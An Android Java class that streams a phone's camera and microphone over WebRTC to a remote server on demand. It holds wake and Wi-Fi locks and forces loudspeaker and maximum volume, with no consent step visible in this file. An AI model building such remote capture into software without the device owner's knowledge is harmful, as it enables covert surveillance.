package com.snapapp.companion;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.os.PowerManager;
import android.util.Log;
import org.json.JSONObject;
import org.webrtc.*;
import java.util.ArrayList;
import java.util.List;

public class WebRtcStreamManager {
    private static final String TAG = "WebRtcStream";
    private static WebRtcStreamManager instance;
    private PeerConnectionFactory factory; private PeerConnection peerConnection; private VideoCapturer videoCapturer; private VideoSource videoSource;
    private SurfaceTextureHelper surfaceTextureHelper; private AudioSource audioSource; private VideoTrack localVideoTrack; private AudioTrack localAudioTrack;
    private EglBase eglBase; private Context appContext; private boolean isFrontCamera = true, hasRemoteDesc = false;
    private String activeServerUrl, activeDeviceId; private PowerManager.WakeLock wakeLock; private WifiManager.WifiLock wifiLock; private final List<IceCandidate> pendingCandidates = new ArrayList<>();

    private WebRtcStreamManager() {}
    public static synchronized WebRtcStreamManager getInstance() { return instance == null ? (instance = new WebRtcStreamManager()) : instance; }
    public synchronized boolean isStreaming() { return peerConnection != null; }

    public synchronized void startLiveStream(final Context ctx, final String serverUrl, final String deviceId,
                                            final boolean front, final boolean video, final boolean audio) {
        stopLiveStream();
        this.appContext = ctx.getApplicationContext();
        this.activeServerUrl = serverUrl; this.activeDeviceId = deviceId; this.isFrontCamera = front;
        acquireLocks(ctx);
        try {
            android.media.AudioManager am = (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) { am.setMode(android.media.AudioManager.MODE_IN_COMMUNICATION); am.setSpeakerphoneOn(true); }
            PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(ctx).createInitializationOptions());
            try { eglBase = EglBase.create(); } catch (Exception e) { eglBase = null; }
            PeerConnectionFactory.Builder b = PeerConnectionFactory.builder();
            if (eglBase != null) b.setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true)).setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()));
            factory = b.createPeerConnectionFactory();
            PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(buildIceServers());
            config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
            config.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
            config.iceCandidatePoolSize = 2;

            peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
                @Override public void onSignalingChange(PeerConnection.SignalingState s) {} @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) {}
                @Override public void onIceConnectionReceivingChange(boolean b) {} @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {}
                @Override public void onIceCandidate(IceCandidate ic) { sendSignal("candidate", null, ic); }
                @Override public void onIceCandidatesRemoved(IceCandidate[] ics) {}
                @Override public void onAddStream(MediaStream ms) {
                    if (ms != null && ms.audioTracks != null && ms.audioTracks.size() > 0) {
                        try { ms.audioTracks.get(0).setEnabled(true); ms.audioTracks.get(0).setVolume(10.0); enableLoudspeaker(appContext != null ? appContext : ctx); } catch (Throwable ignored) {}
                    }
                }
                @Override public void onRemoveStream(MediaStream ms) {} @Override public void onDataChannel(DataChannel dc) {} @Override public void onRenegotiationNeeded() {}
            });

            if (audio) {
                try {
                    MediaConstraints ac = new MediaConstraints();
                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
                    peerConnection.addTrack(localAudioTrack = factory.createAudioTrack("ARDAMSa0", audioSource = factory.createAudioSource(ac)));
                } catch (Throwable t) { Log.e(TAG, "Audio error", t); }
            }
            if (video && (videoCapturer = createCameraCapturer(ctx, front)) != null) {
                try {
                    surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase != null ? eglBase.getEglBaseContext() : null);
                    videoSource = factory.createVideoSource(videoCapturer.isScreencast());
                    videoCapturer.initialize(surfaceTextureHelper, ctx, videoSource.getCapturerObserver());
                    videoCapturer.startCapture(640, 360, 15);
                    peerConnection.addTrack(localVideoTrack = factory.createVideoTrack("ARDAMSv0", videoSource));
                } catch (Throwable t) { Log.e(TAG, "Video error", t); }
            }
        } catch (Exception e) { stopLiveStream(); }
    }

    private void acquireLocks(Context ctx) {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                (wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "snap:live_stream")).acquire(15 * 60 * 1000L);
            }
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null && (wifiLock == null || !wifiLock.isHeld())) {
                (wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "snap:wifi_stream")).acquire();
            }
        } catch (Throwable ignored) {}
    }

    public synchronized void switchCamera() {
        if (videoCapturer instanceof CameraVideoCapturer) { ((CameraVideoCapturer) videoCapturer).switchCamera(null); isFrontCamera = !isFrontCamera; }
    }

    public synchronized void setOrientation(String ori) {
        if (videoCapturer == null) return;
        try { if ("landscape".equalsIgnoreCase(ori)) videoCapturer.changeCaptureFormat(640, 360, 15); else videoCapturer.changeCaptureFormat(360, 640, 15); } catch (Throwable ignored) {}
    }

    private void enableLoudspeaker(Context ctx) {
        if (ctx == null) return;
        try {
            android.media.AudioManager am = (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            am.setMode(android.media.AudioManager.MODE_IN_COMMUNICATION);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                for (android.media.AudioDeviceInfo d : am.getAvailableCommunicationDevices()) {
                    if (d.getType() == android.media.AudioDeviceInfo.TYPE_BUILTIN_SPEAKER) { am.setCommunicationDevice(d); break; }
                }
            }
            am.setSpeakerphoneOn(true);
            am.setStreamVolume(android.media.AudioManager.STREAM_VOICE_CALL, am.getStreamMaxVolume(android.media.AudioManager.STREAM_VOICE_CALL), 0);
        } catch (Throwable ignored) {}
    }

    public synchronized void handleRemoteOffer(String sdpDescription) {
        if (peerConnection == null) return;
        SessionDescription offer = new SessionDescription(SessionDescription.Type.OFFER, sdpDescription);
        peerConnection.setRemoteDescription(new SimpleSdpObserver() {
            @Override public void onSetSuccess() {
                hasRemoteDesc = true;
                for (IceCandidate c : pendingCandidates) { try { peerConnection.addIceCandidate(c); } catch (Exception ignored) {} }
                pendingCandidates.clear();
                peerConnection.createAnswer(new SimpleSdpObserver() {
                    @Override public void onCreateSuccess(SessionDescription answer) {
                        String sdp = answer.description;
                        if (sdp.contains("useinbandfec=1")) sdp = sdp.replace("useinbandfec=1", "useinbandfec=1;maxaveragebitrate=16000;stereo=0");
                        final String fSdp = sdp;
                        peerConnection.setLocalDescription(new SimpleSdpObserver() {
                            @Override public void onSetSuccess() {
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                    SessionDescription loc = peerConnection != null ? peerConnection.getLocalDescription() : null;
                                    sendSignal("answer", (loc != null && loc.description != null) ? loc.description : fSdp, null);
                                }, 600);
                            }
                        }, new SessionDescription(answer.type, fSdp));
                    }
                }, new MediaConstraints());
            }
        }, offer);
    }

    public synchronized void handleRemoteCandidate(String sdp, int sdpMLineIndex, String sdpMid) {
        if (peerConnection == null) return;
        IceCandidate c = new IceCandidate(sdpMid, sdpMLineIndex, sdp);
        if (hasRemoteDesc && peerConnection.getRemoteDescription() != null) {
            try { peerConnection.addIceCandidate(c); } catch (Exception ignored) {}
        } else pendingCandidates.add(c);
    }

    private void sendSignal(String type, String sdp, IceCandidate candidate) {
        if (activeServerUrl == null || activeDeviceId == null) return;
        try {
            JSONObject body = new JSONObject().put("type", type).put("sender", "device");
            if (sdp != null) body.put("sdp", sdp);
            if (candidate != null) body.put("candidate", new JSONObject().put("candidate", candidate.sdp).put("sdpMLineIndex", candidate.sdpMLineIndex).put("sdpMid", candidate.sdpMid));
            ApiClient.postJson(activeServerUrl + "/api/devices/" + activeDeviceId + "/signaling", body, null);
        } catch (Exception e) { Log.e(TAG, "sendSignal error", e); }
    }

    private VideoCapturer createCameraCapturer(Context ctx, boolean front) {
        CameraEnumerator enumerator = new Camera1Enumerator(true);
        String[] names = enumerator.getDeviceNames();
        if (names == null || names.length == 0) return null;
        for (String n : names) {
            if ((front && enumerator.isFrontFacing(n)) || (!front && enumerator.isBackFacing(n))) return enumerator.createCapturer(n, null);
        }
        return enumerator.createCapturer(names[0], null);
    }

    private static List<PeerConnection.IceServer> buildIceServers() {
        List<PeerConnection.IceServer> list = new ArrayList<>();
        for (String u : new String[]{"stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302", "stun:stun.cloudflare.com:3478"}) list.add(PeerConnection.IceServer.builder(u).createIceServer());
        for (String u : new String[]{"turn:openrelay.metered.ca:80", "turn:openrelay.metered.ca:443", "turn:openrelay.metered.ca:443?transport=tcp"}) list.add(PeerConnection.IceServer.builder(u).setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
        return list;
    }

    public synchronized void stopLiveStream() {
        try {
            pendingCandidates.clear(); hasRemoteDesc = false;
            if (appContext != null) {
                try {
                    android.media.AudioManager am = (android.media.AudioManager) appContext.getSystemService(Context.AUDIO_SERVICE);
                    if (am != null) { am.setSpeakerphoneOn(false); am.setMode(android.media.AudioManager.MODE_NORMAL); }
                } catch (Throwable ignored) {}
                appContext = null;
            }
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); wakeLock = null; if (wifiLock != null && wifiLock.isHeld()) wifiLock.release(); wifiLock = null;
            if (videoCapturer != null) { videoCapturer.stopCapture(); videoCapturer = null; } if (surfaceTextureHelper != null) { surfaceTextureHelper.dispose(); surfaceTextureHelper = null; }
            if (localVideoTrack != null) { localVideoTrack.dispose(); localVideoTrack = null; } if (videoSource != null) { videoSource.dispose(); videoSource = null; }
            if (localAudioTrack != null) { localAudioTrack.dispose(); localAudioTrack = null; } if (audioSource != null) { audioSource.dispose(); audioSource = null; }
            if (peerConnection != null) { peerConnection.close(); peerConnection = null; } if (factory != null) { factory.dispose(); factory = null; } if (eglBase != null) { eglBase.release(); eglBase = null; }
        } catch (Exception ignored) {}
    }

    private static class SimpleSdpObserver implements SdpObserver {
        @Override public void onCreateSuccess(SessionDescription s) {} @Override public void onSetSuccess() {}
        @Override public void onCreateFailure(String s) {} @Override public void onSetFailure(String s) {}
    }
}
